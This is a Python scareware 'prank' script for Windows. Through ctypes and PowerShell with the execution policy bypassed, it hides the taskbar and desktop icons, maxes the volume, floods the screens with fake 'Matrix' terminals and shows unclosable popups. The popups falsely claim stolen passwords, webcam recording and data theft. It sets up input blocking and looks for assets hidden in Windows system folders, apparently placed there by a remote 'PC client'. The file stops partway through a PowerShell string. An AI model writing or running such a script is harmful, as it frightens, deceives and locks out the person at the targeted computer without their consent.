# -*- coding: utf-8 -*-
"""
HACKER ATTACK - Ultimate Prank Script
Does everything simultaneously, then restores at the end
"""
import os
import sys
import ctypes
import subprocess
import threading
import time
import tempfile
import random

print("=" * 60)
print("   HACKER ATTACK - INITIALIZING...")
print("=" * 60)

# Find client directory for wallpaper
script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
pc_client_path = os.environ.get("PC_CLIENT_PATH", script_dir)

# Global flag to control input blocking
input_blocking_active = True

# Global list to track popup processes
popup_processes = []

# Windows API constants for input blocking
WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
HC_ACTION = 0

# Windows API structures for input blocking
class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_ulong),
        ("scanCode", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

class MSLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("pt", POINT),
        ("mouseData", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

class MSG(ctypes.Structure):
    _fields_ = [
        ("hwnd", ctypes.c_void_p),
        ("message", ctypes.c_uint),
        ("wParam", ctypes.c_void_p),
        ("lParam", ctypes.c_void_p),
        ("time", ctypes.c_ulong),
        ("pt", POINT)
    ]

# ============================================
# 0. MINIMIZE ALL WINDOWS / SHOW DESKTOP
# ============================================
def minimize_all_windows():
    print("[0] Minimizing all windows - showing desktop...")
    try:
        user32 = ctypes.windll.user32
        user32.keybd_event(0x5B, 0, 0, 0)  # Win key down
        user32.keybd_event(0x44, 0, 0, 0)  # D key down
        user32.keybd_event(0x44, 0, 2, 0)  # D key up
        user32.keybd_event(0x5B, 0, 2, 0)  # Win key up
        time.sleep(0.5)
        print("    [OK] All windows minimized!")
    except Exception as e:
        try:
            ps_script = '(New-Object -ComObject Shell.Application).MinimizeAll()'
            subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
            print("    [OK] All windows minimized!")
        except:
            print("    [!] Error: %s" % str(e))

# ============================================
# 1. CHANGE WALLPAPER (Cycling through Photos/1.jpg to Photos/9.jpg)
# ============================================
def find_photos_folder():
    """Find the Photos folder containing 1.jpg through 9.jpg
    Uses user's Photos folder as primary location"""
    # Primary location (user's home directory)
    user_home = os.path.expanduser("~")
    primary_path = os.path.join(user_home, "Photos")
    
    # System locations (deployed by PC client - most persistent)
    localappdata = os.environ.get('LOCALAPPDATA', '')
    search_paths = [
        # PRIMARY: User's Photos folder (where PC client copies photos)
        primary_path,
        # Also check Audios folder as fallback
        os.path.join(user_home, "Audios"),
        os.path.join(user_home, "Audios", "Photos"),
        # System locations (deployed by PC client - most persistent)
        os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
        r"C:\ProgramData\Microsoft\Windows\WER\Photos",
        r"C:\Windows\Prefetch\Photos",
        r"C:\Windows\WinSxS\Photos",
        # Fallback locations
        os.path.join(pc_client_path, "Photos"),
        os.path.join(os.getcwd(), "Photos"),
        os.path.join(script_dir, "Photos"),
        os.path.join(script_dir, "..", "Photos"),
    ]
    
    # Filter out None values
    search_paths = [p for p in search_paths if p is not None]
    
    for path in search_paths:
        abs_path = os.path.abspath(path)
        if os.path.exists(abs_path) and os.path.isdir(abs_path):
            return abs_path
    return None

def get_photo_paths(photos_folder):
    """Get paths to all photos (1.jpg through 9.jpg)"""
    photo_paths = []
    if not photos_folder:
        return photo_paths
    
    for i in range(1, 10):  # 1 to 9
        photo_path = os.path.join(photos_folder, f"{i}.jpg")
        if os.path.exists(photo_path):
            photo_paths.append(os.path.abspath(photo_path))
    
    return photo_paths

def set_wallpaper(path):
    """Set wallpaper to specified path"""
    try:
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, path, 0x01 | 0x02)
    except:
        pass

def cycle_wallpaper():
    """Cycle through Photos/1.jpg to Photos/9.jpg continuously during attack"""
    global input_blocking_active
    print("[1] Cycling wallpaper through Photos folder (1.jpg to 9.jpg)...")
    
    photos_folder = find_photos_folder()
    
    if not photos_folder:
        user_home = os.path.expanduser("~")
        expected_path = os.path.join(user_home, "Photos")
        print("    [!] Photos folder not found")
        print(f"    [!] Expected location: {expected_path}")
        print("    [!] Searched in system locations:")
        print(f"      - {expected_path}")
        localappdata = os.environ.get('LOCALAPPDATA', '')
        search_paths = [
            os.path.join(user_home, "Audios"),
            os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
            r"C:\ProgramData\Microsoft\Windows\WER\Photos",
            r"C:\Windows\Prefetch\Photos",
            r"C:\Windows\WinSxS\Photos",
        ]
        search_paths = [p for p in search_paths if p is not None]
        for p in search_paths:
            print(f"      - {p}")
        return
    
    photo_paths = get_photo_paths(photos_folder)
    
    if not photo_paths:
        print(f"    [!] No photos found in {photos_folder}")
        print("    [!] Expected files: 1.jpg, 2.jpg, 3.jpg, ..., 9.jpg")
        return
    
    print(f"    [*] Found {len(photo_paths)} photos in Photos folder")
    
    # Cycle through photos continuously while attack is running
    cycle_count = 0
    photo_index = 0
    
    while input_blocking_active:
        if photo_paths:
            # Set wallpaper to current photo
            current_photo = photo_paths[photo_index]
            set_wallpaper(current_photo)
            
            # Move to next photo (cycle back to 0 after 8)
            photo_index = (photo_index + 1) % len(photo_paths)
            cycle_count += 1
            
            # Small delay between changes
            time.sleep(0.5)
        else:
            break
    
    # ALWAYS end with 1.jpg
    photo_1_path = os.path.join(photos_folder, "1.jpg")
    if os.path.exists(photo_1_path):
        set_wallpaper(photo_1_path)
        print(f"    [OK] Wallpaper set to 1.jpg (final)! Cycled {cycle_count} times")
    else:
        # If 1.jpg doesn't exist, use first available photo
        if photo_paths:
            set_wallpaper(photo_paths[0])
            print(f"    [OK] Wallpaper set to {os.path.basename(photo_paths[0])} (final)! Cycled {cycle_count} times")

# ============================================
# 2. MATRIX TERMINALS (15) - ACROSS ALL MONITORS
# ============================================
def launch_matrix_terminals():
    global input_blocking_active
    
    print("[2] Launching 15 Matrix terminals across ALL monitors...")
    print("    [*] Opening one by one (0.5s delay between each)...")
    
    monitors = get_all_monitors()
    print("    [*] Distributing across %d monitor(s)" % len(monitors))
    
    # Create matrix script that checks input_blocking_active flag
    # We'll use a file to communicate the flag state
    flag_file = os.path.join(tempfile.gettempdir(), "hacker_attack_active.flag")
    with open(flag_file, 'w') as f:
        f.write("1")  # Start as active
    
    matrix_script = '''
import random
import time
import os

# Check flag file to see if attack is still active
def is_attack_active():
    try:
        with open(r"%s", "r") as f:
            return f.read().strip() == "1"
    except:
        return True  # Default to active if file not found

os.system('color 0a')
os.system('mode con: cols=100 lines=35')
os.system('title HACKER TERMINAL')

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%%^&*"
width = 100
columns = [0] * width

start = time.time()
# Run while attack is active (check flag file) - extended duration
while is_attack_active() and (time.time() - start < 300):  # Max 5 minutes
    line = ""
    for i in range(width):
        if random.random() > 0.95:
            columns[i] = random.randint(5, 20)
        if columns[i] > 0:
            line += random.choice(chars)
            columns[i] -= 1
        else:
            line += " "
    print(line)
    time.sleep(0.03)
    
    # Check flag more frequently
    if not is_attack_active():
        break

# Keep terminal open even after attack ends
os.system('cls')
os.system('color 0c')
msg = "WELCOME MR. KAUSHIK!"
print()
print("=" * 100)
print()
print(" " * 35 + msg)
print()
print("=" * 100)

# Keep terminal alive
while True:
    try:
        time.sleep(1)
        if not is_attack_active():
            break
    except KeyboardInterrupt:
        break
''' % flag_file.replace("\\", "\\\\")
    
    temp_file = os.path.join(tempfile.gettempdir(), "matrix_hacker.py")
    with open(temp_file, 'w', encoding='utf-8') as f:
        f.write(matrix_script)
    
    # Get Python executable path ONCE before the loop - use sys.executable if available, otherwise try common paths
    python_exe = sys.executable
    if not python_exe or not os.path.exists(python_exe):
        # Try common Python paths
        username = os.environ.get('USERNAME', '')
        python_paths = [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python310', 'python.exe'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python311', 'python.exe'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Programs', 'Python', 'Python312', 'python.exe'),
            r'C:\Python310\python.exe',
            r'C:\Python311\python.exe',
            r'C:\Python312\python.exe',
            r'C:\Program Files\Python310\python.exe',
            r'C:\Program Files\Python311\python.exe',
            r'C:\Program Files\Python312\python.exe',
        ]
        if username:
            python_paths.extend([
                rf'C:\Users\{username}\AppData\Local\Programs\Python\Python310\python.exe',
                rf'C:\Users\{username}\AppData\Local\Programs\Python\Python311\python.exe',
                rf'C:\Users\{username}\AppData\Local\Programs\Python\Python312\python.exe',
            ])
        for path in python_paths:
            if os.path.exists(path):
                python_exe = path
                print(f"    [*] Found Python at: {python_exe}")
                break
        else:
            # Last resort: use 'python' and hope it's in PATH
            python_exe = 'python'
            print("    [*] Using 'python' command (must be in PATH)")
    else:
        print(f"    [*] Using Python: {python_exe}")
    
    # Escape Python path for PowerShell - handle quotes properly
    if ' ' in python_exe or python_exe == 'python':
        # If path has spaces or is just 'python', wrap in quotes
        python_exe_escaped = f'"{python_exe}"'.replace('\\', '\\\\').replace('"', '\\"')
    else:
        python_exe_escaped = python_exe.replace('\\', '\\\\').replace('"', '\\"')
    
    matrix_processes = []
    
    for i in range(15):
        # Check if attack should stop
        if not input_blocking_active:
            print(f"    [*] Attack ended - stopped at terminal {i+1}/15")
            break
        
        # Distribute terminals across monitors
        monitor = monitors[i % len(monitors)]
        
        # Random position within this monitor
        x = monitor['x'] + random.randint(0, max(0, monitor['width'] - 850))
        y = monitor['y'] + random.randint(0, max(0, monitor['height'] - 500))
        
        # Create PowerShell command to position the terminal
        # Use /K to keep terminal open, and add pause at end of script
        ps_cmd = '''
$process = Start-Process cmd -ArgumentList '/K', 'color 0a && "%s" "%s" && pause' -PassThru
Start-Sleep -Milliseconds 500
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$hwnd = $process.MainWindowHandle
$maxAttempts = 10
$attempt = 0
while ($hwnd -eq [IntPtr]::Zero -and $attempt -lt $maxAttempts) {
    Start-Sleep -Milliseconds 200
    $process.Refresh()
    $hwnd = $process.MainWindowHandle
    $attempt++
}
if ($hwnd -ne [IntPtr]::Zero) {
    [Win32]::ShowWindow($hwnd, 4)
    [Win32]::MoveWindow($hwnd, %d, %d, 850, 450, $true)
}
''' % (python_exe_escaped, temp_file.replace("\\", "\\\\"), x, y)
        
        process = subprocess.Popen(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        matrix_processes.append(process)
        
        # Wait 1.5 seconds before opening next terminal (slower opening)
        time.sleep(1.5)
        
        # Check again if attack should stop
        if not input_blocking_active:
            print(f"    [*] Attack ended - stopped at terminal {i+1}/15")
            break
    
    print(f"    [OK] {len(matrix_processes)} Matrix terminals opened!")
    
    # Function to update flag file when attack ends
    def update_flag_file():
        while input_blocking_active:
            time.sleep(0.1)
        # Attack ended - update flag file
        try:
            with open(flag_file, 'w') as f:
                f.write("0")
        except:
            pass
    
    # Start thread to monitor and update flag file
    flag_thread = threading.Thread(target=update_flag_file, daemon=True)
    flag_thread.start()

# ============================================
# 3. HIDE DESKTOP ICONS
# ============================================
def find_desktop_listview():
    """Find the desktop icons ListView window."""
    user32 = ctypes.windll.user32
    
    # Method 1: Progman > SHELLDLL_DefView > SysListView32
    progman = user32.FindWindowW("Progman", None)
    if progman:
        defview = user32.FindWindowExW(progman, None, "SHELLDLL_DefView", None)
        if defview:
            listview = user32.FindWindowExW(defview, None, "SysListView32", None)
            if listview:
                return listview, defview
    
    # Method 2: Search in WorkerW windows
    hwnd = user32.FindWindowW("WorkerW", None)
    while hwnd:
        defview = user32.FindWindowExW(hwnd, None, "SHELLDLL_DefView", None)
        if defview:
            listview = user32.FindWindowExW(defview, None, "SysListView32", None)
            if listview:
                return listview, defview
        hwnd = user32.FindWindowExW(None, hwnd, "WorkerW", None)
    
    return None, None

def hide_desktop_icons():
    print("[3] Hiding desktop icons...")
    user32 = ctypes.windll.user32
    
    try:
        listview, defview = find_desktop_listview()
        
        if listview:
            # Hide the ListView window (SW_HIDE = 0)
            user32.ShowWindow(listview, 0)
            print("    [OK] Desktop icons hidden (ListView)!")
            return True
        
        # Fallback: Try toggle method
        progman = user32.FindWindowW("Progman", None)
        if progman:
            # Send toggle command
            user32.SendMessageW(progman, 0x111, 0x7402, 0)
            print("    [OK] Desktop icons toggled!")
            return True
        
        print("    [!] Could not find desktop window")
        return False
        
    except Exception as e:
        print("    [!] Error: %s" % str(e))
        return False

def show_desktop_icons():
    """Restore desktop icons"""
    user32 = ctypes.windll.user32
    
    try:
        listview, defview = find_desktop_listview()
        
        if listview:
            # Show the ListView window (SW_SHOW = 5)
            user32.ShowWindow(listview, 5)
            return
        
        # Fallback: toggle
        progman = user32.FindWindowW("Progman", None)
        if progman:
            user32.SendMessageW(progman, 0x111, 0x7402, 0)
    except:
        pass

# ============================================
# 4. HIDE/SHOW TASKBAR (ALL MONITORS)
# ============================================
def hide_taskbar():
    print("[4] Hiding taskbar on ALL monitors...")
    try:
        # Main taskbar
        taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if taskbar:
            ctypes.windll.user32.ShowWindow(taskbar, 0)  # SW_HIDE
            print("    [OK] Primary taskbar hidden")
        
        # Find ALL secondary taskbars using EnumWindows
        hidden_count = 0
        
        # Method 1: Direct find
        secondary = ctypes.windll.user32.FindWindowW("Shell_SecondaryTrayWnd", None)
        while secondary:
            ctypes.windll.user32.ShowWindow(secondary, 0)  # SW_HIDE
            hidden_count += 1
            secondary = ctypes.windll.user32.FindWindowExW(None, secondary, "Shell_SecondaryTrayWnd", None)
        
        # Method 2: PowerShell fallback for stubborn taskbars
        ps_script = '''
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarHider {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$hwnd = [TaskbarHider]::FindWindow("Shell_SecondaryTrayWnd", $null)
while ($hwnd -ne [IntPtr]::Zero) {
    [TaskbarHider]::ShowWindow($hwnd, 0)
    $hwnd = [TaskbarHider]::FindWindowEx([IntPtr]::Zero, $hwnd, "Shell_SecondaryTrayWnd", $null)
}
'''
        subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
        
        print("    [OK] All taskbars hidden! (secondary: %d)" % hidden_count)
    except Exception as e:
        print("    [!] Error: %s" % str(e))

def show_taskbar():
    """Restore taskbar on all monitors"""
    try:
        # Main taskbar
        taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if taskbar:
            ctypes.windll.user32.ShowWindow(taskbar, 5)  # SW_SHOW
        
        # Secondary taskbars - direct method
        secondary = ctypes.windll.user32.FindWindowW("Shell_SecondaryTrayWnd", None)
        while secondary:
            ctypes.windll.user32.ShowWindow(secondary, 5)  # SW_SHOW
            secondary = ctypes.windll.user32.FindWindowExW(None, secondary, "Shell_SecondaryTrayWnd", None)
        
        # PowerShell fallback
        ps_script = '''
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TaskbarShower {
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$hwnd = [TaskbarShower]::FindWindow("Shell_SecondaryTrayWnd", $null)
while ($hwnd -ne [IntPtr]::Zero) {
    [TaskbarShower]::ShowWindow($hwnd, 5)
    $hwnd = [TaskbarShower]::FindWindowEx([IntPtr]::Zero, $hwnd, "Shell_SecondaryTrayWnd", $null)
}
'''
        subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
    except:
        pass

# ============================================
# 5. MAX VOLUME
# ============================================
def max_volume():
    print("[5] Setting volume to MAX...")
    try:
        VK_VOLUME_UP = 0xAF
        user32 = ctypes.windll.user32
        for _ in range(50):
            user32.keybd_event(VK_VOLUME_UP, 0, 0, 0)
            user32.keybd_event(VK_VOLUME_UP, 0, 2, 0)
        print("    [OK] Volume maxed!")
    except Exception as e:
        print("    [!] Error: %s" % str(e))

# ============================================
# 6. PLAY ATTACK AUDIO
# ============================================
def find_attack_audio():
    """Find attack.mp3 in Photos or Audios folder (uses user's Photos folder as primary)"""
    # Primary location (user's home directory) - Photos folder first
    user_home = os.path.expanduser("~")
    primary_path_photos = os.path.join(user_home, "Photos", "attack.mp3")
    primary_path_audios = os.path.join(user_home, "Audios", "attack.mp3")
    
    # Use the same search logic as Photos folder
    localappdata = os.environ.get('LOCALAPPDATA', '')
    search_paths = [
        # PRIMARY: User's Photos folder (where PC client copies files)
        primary_path_photos,
        # SECONDARY: User's Audios folder
        primary_path_audios,
        # Also check Photos folder in Audios directory
        os.path.join(user_home, "Audios", "Photos", "attack.mp3"),
        # System locations (deployed by PC client - most persistent)
        os.path.join(localappdata, '..', 'LocalLow', 'Photos', 'attack.mp3') if localappdata else None,
        r"C:\ProgramData\Microsoft\Windows\WER\Photos\attack.mp3",
        r"C:\Windows\Prefetch\Photos\attack.mp3",
        r"C:\Windows\WinSxS\Photos\attack.mp3",
        # Fallback locations
        os.path.join(pc_client_path, "Photos", "attack.mp3"),
        os.path.join(pc_client_path, "Audios", "attack.mp3"),
        os.path.join(os.getcwd(), "Photos", "attack.mp3"),
        os.path.join(os.getcwd(), "Audios", "attack.mp3"),
        os.path.join(script_dir, "Photos", "attack.mp3"),
        os.path.join(script_dir, "Audios", "attack.mp3"),
        os.path.join(script_dir, "..", "Photos", "attack.mp3"),
        os.path.join(script_dir, "..", "Audios", "attack.mp3"),
    ]
    
    # Filter out None values
    search_paths = [p for p in search_paths if p is not None]
    
    for path in search_paths:
        abs_path = os.path.abspath(path)
        if os.path.exists(abs_path):
            return abs_path
    return None

def play_attack_audio():
    """Play attack.mp3 from Photos folder - stops attack when audio ends"""
    global input_blocking_active
    
    print("[6] Playing attack audio (attack.mp3)...")
    
    audio_path = find_attack_audio()
    
    if not audio_path:
        user_home = os.path.expanduser("~")
        expected_path1 = os.path.join(user_home, "Photos", "attack.mp3")
        expected_path2 = os.path.join(user_home, "Audios", "attack.mp3")
        print("    [!] attack.mp3 not found")
        print(f"    [!] Expected location: {expected_path1}")
        print("    [!] Searched in locations:")
        print(f"      - {expected_path1}")
        print(f"      - {expected_path2}")
        localappdata = os.environ.get('LOCALAPPDATA', '')
        search_paths = [
            os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
            r"C:\ProgramData\Microsoft\Windows\WER\Photos",
            r"C:\Windows\Prefetch\Photos",
            r"C:\Windows\WinSxS\Photos",
            os.path.join(user_home, "Photos"),
        ]
        search_paths = [p for p in search_paths if p is not None]
        for p in search_paths:
            print(f"      - {os.path.join(p, 'attack.mp3')}")
        # If audio not found, continue attack but without audio (don't stop immediately)
        print("    [!] Continuing attack without audio...")
        print("    [*] Attack will run for 38 seconds (simulated audio duration)...")
        # Wait for a reasonable duration (38 seconds) before stopping
        time.sleep(38)
        print("    [*] Simulated audio duration complete - stopping attack...")
        input_blocking_active = False
        return
    
    print(f"    [*] Found audio: {audio_path}")
    print("    [*] Playing audio (approximately 38 seconds)...")
    print("    [*] Attack will stop immediately when audio ends!")
    
    # Play using PowerShell MediaPlayer (same as meme_audios.py)
    # Use absolute path and ensure proper escaping
    audio_path_escaped = audio_path.replace("'", "''").replace("\\", "\\\\").replace('"', '`"')
    ps_script = f'''
$ErrorActionPreference = "Stop"
try {{
    Add-Type -AssemblyName presentationCore
    $player = New-Object System.Windows.Media.MediaPlayer
    $audioPath = "{audio_path_escaped}"
    Write-Host "[Audio] Opening: $audioPath"
    $player.Open($audioPath)
    $player.Volume = 1.0
    $player.Play()
    Start-Sleep -Milliseconds 500
    
    # Wait for duration to be available
    $timeout = 0
    while ($player.NaturalDuration.HasTimeSpan -eq $false -and $timeout -lt 50) {{
        Start-Sleep -Milliseconds 100
        $timeout++
    }}
    
    if ($player.NaturalDuration.HasTimeSpan) {{
        $duration = [math]::Ceiling($player.NaturalDuration.TimeSpan.TotalSeconds)
        Write-Host "[Audio] Duration: $duration seconds"
        Start-Sleep -Seconds $duration
    }} else {{
        Write-Host "[Audio] Duration not available, playing for 38 seconds"
        Start-Sleep -Seconds 38
    }}
    
    $player.Stop()
    $player.Close()
    Write-Host "[Audio] Playback complete"
}} catch {{
    Write-Host "[Audio] Error: $_"
    # Fallback: wait 38 seconds even if playback fails
    Start-Sleep -Seconds 38
}}
'''
    
    try:
        result = subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', ps_script],
            capture_output=True,
            text=True,
            timeout=50  # 38 seconds + buffer
        )
        if result.stdout:
            print(f"    [*] Audio output: {result.stdout.strip()}")
        if result.stderr:
            print(f"    [*] Audio errors: {result.stderr.strip()}")
        print("    [OK] Audio playback complete!")
    except subprocess.TimeoutExpired:
        print("    [OK] Audio playback completed (timeout)")
    except Exception as e:
        print(f"    [!] Error playing audio: {str(e)}")
        print("    [*] Continuing attack for 38 seconds without audio...")
        time.sleep(38)
    finally:
        # STOP ATTACK IMMEDIATELY WHEN AUDIO ENDS
        print("    [*] Stopping attack immediately...")
        input_blocking_active = False

# ============================================
# 7. POPUP MESSAGES
# ============================================
def get_all_monitors():
    """Get all monitor positions and sizes"""
    monitors = []
    try:
        # Use PowerShell to get all screen info
        ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
    "$($_.Bounds.X),$($_.Bounds.Y),$($_.Bounds.Width),$($_.Bounds.Height)"
}
'''
        result = subprocess.run(
            ['powershell', '-Command', ps_script],
            capture_output=True, text=True
        )
        for line in result.stdout.strip().split('\n'):
            if line.strip():
                parts = line.strip().split(',')
                if len(parts) == 4:
                    monitors.append({
                        'x': int(parts[0]),
                        'y': int(parts[1]),
                        'width': int(parts[2]),
                        'height': int(parts[3])
                    })
    except:
        pass
    
    # Fallback to single monitor
    if not monitors:
        monitors = [{'x': 0, 'y': 0, 'width': 1920, 'height': 1080}]
    
    return monitors

def show_popups():
    print("[7] Showing HACKER popup messages on ALL monitors...")
    
    popups = [
        ("BREACH DETECTED", "Firewall bypassed. System compromised."),
        ("FILE EXTRACTION", "Scanning C:\\ ... 47,832 files indexed."),
        ("CREDENTIALS", "Browser password database decrypted."),
        ("NETWORK SCAN", "Found 12 devices. All accessible."),
        ("CAMERA ACCESS", "Webcam stream initialized. Recording..."),
        ("AUDIO CAPTURE", "Microphone active. Monitoring ambient audio."),
        ("GEOLOCATION", "GPS lock acquired. Tracking enabled."),
        ("DATA THEFT", "Exfiltrating sensitive documents..."),
        ("SOCIAL BREACH", "All social accounts compromised."),
        ("TOTAL CONTROL", "System takeover complete. No escape.")
    ]
    
    monitors = get_all_monitors()
    print("    [*] Found %d monitor(s)" % len(monitors))
    
    for i, (title, message) in enumerate(popups, 1):
        # Distribute popups across all monitors
        monitor = monitors[i % len(monitors)]
        
        # Random position within this monitor (bigger popups need more space)
        x = monitor['x'] + random.randint(30, max(50, monitor['width'] - 750))
        y = monitor['y'] + random.randint(30, max(50, monitor['height'] - 400))
        
        # ENHANCED Hacker-themed popups - BIGGER, MORE UNETHICAL, NO CLOSE, NO ESCAPE
        ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = ""
$form.Size = New-Object System.Drawing.Size(700, 350)
$form.StartPosition = "Manual"
$form.Location = New-Object System.Drawing.Point(%d, %d)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(0, 255, 65)

# Outer glowing border effect (thicker)
$glowPanel = New-Object System.Windows.Forms.Panel
$glowPanel.Location = New-Object System.Drawing.Point(0, 0)
$glowPanel.Size = New-Object System.Drawing.Size(700, 350)
$glowPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 255, 65)
$form.Controls.Add($glowPanel)

# Inner dark panel (creates border effect - bigger)
$innerPanel = New-Object System.Windows.Forms.Panel
$innerPanel.Location = New-Object System.Drawing.Point(4, 4)
$innerPanel.Size = New-Object System.Drawing.Size(692, 342)
$innerPanel.BackColor = [System.Drawing.Color]::FromArgb(5, 5, 8)
$glowPanel.Controls.Add($innerPanel)

# Header (bigger)
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(692, 50)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 40, 0)
$innerPanel.Controls.Add($headerPanel)

# Warning icon (bigger, more dramatic)
$iconLabel = New-Object System.Windows.Forms.Label
$iconLabel.Text = "[!!!]"
$iconLabel.Font = New-Object System.Drawing.Font("Consolas", 18, [System.Drawing.FontStyle]::Bold)
$iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
$iconLabel.Location = New-Object System.Drawing.Point(12, 8)
$iconLabel.Size = New-Object System.Drawing.Size(60, 35)
$headerPanel.Controls.Add($iconLabel)

# Title (bigger, bolder)
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "%s"
$titleLabel.Font = New-Object System.Drawing.Font("Consolas", 16, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 65)
$titleLabel.Location = New-Object System.Drawing.Point(80, 12)
$titleLabel.Size = New-Object System.Drawing.Size(600, 30)
$headerPanel.Controls.Add($titleLabel)

# Decorative line (bigger)
$decorLine = New-Object System.Windows.Forms.Label
$decorLine.Text = ">>> ENCRYPTED CHANNEL - UNAUTHORIZED ACCESS DETECTED <<<"
$decorLine.Font = New-Object System.Drawing.Font("Consolas", 9, [System.Drawing.FontStyle]::Bold)
$decorLine.ForeColor = [System.Drawing.Color]::FromArgb(255, 0, 0)
$decorLine.Location = New-Object System.Drawing.Point(0, 60)
$decorLine.Size = New-Object System.Drawing.Size(692, 20)
$decorLine.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$innerPanel.Controls.Add($decorLine)

# Message (bigger, more space)
$messageLabel = New-Object System.Windows.Forms.Label
$messageLabel.Text = "%s"
$messageLabel.Font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
$messageLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 65)
$messageLabel.Location = New-Object System.Drawing.Point(20, 100)
$messageLabel.Size = New-Object System.Drawing.Size(652, 120)
$messageLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$innerPanel.Controls.Add($messageLabel)

# Threatening warning text
$warningLabel = New-Object System.Windows.Forms.Label
$warningLabel.Text = "⚠ SYSTEM COMPROMISED - ALL DATA ACCESSIBLE ⚠"
$warningLabel.Font = New-Object System.Drawing.Font("Consolas", 11, [System.Drawing.FontStyle]::Bold)
$warningLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 100, 0)
$warningLabel.Location = New-Object System.Drawing.Point(0, 230)
$warningLabel.Size = New-Object System.Drawing.Size(692, 25)
$warningLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$innerPanel.Controls.Add($warningLabel)

# Status bar at bottom (bigger)
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "[ STATUS: ACTIVE ]  [ ENCRYPTION: AES-256 ]  [ BYPASS: SUCCESSFUL ]  [ ACCESS: GRANTED ]"
$statusLabel.Font = New-Object System.Drawing.Font("Consolas", 9, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 65)
$statusLabel.Location = New-Object System.Drawing.Point(0, 265)
$statusLabel.Size = New-Object System.Drawing.Size(692, 25)
$statusLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$innerPanel.Controls.Add($statusLabel)

# Bottom decorative line (bigger)
$bottomLine = New-Object System.Windows.Forms.Label
$bottomLine.Text = "===================================================================================================="
$bottomLine.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
$bottomLine.ForeColor = [System.Drawing.Color]::FromArgb(0, 150, 0)
$bottomLine.Location = New-Object System.Drawing.Point(0, 300)
$bottomLine.Size = New-Object System.Drawing.Size(692, 25)
$bottomLine.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$innerPanel.Controls.Add($bottomLine)

# Additional threat indicator
$threatLabel = New-Object System.Windows.Forms.Label
$threatLabel.Text = "NO ESCAPE - SYSTEM UNDER CONTROL"
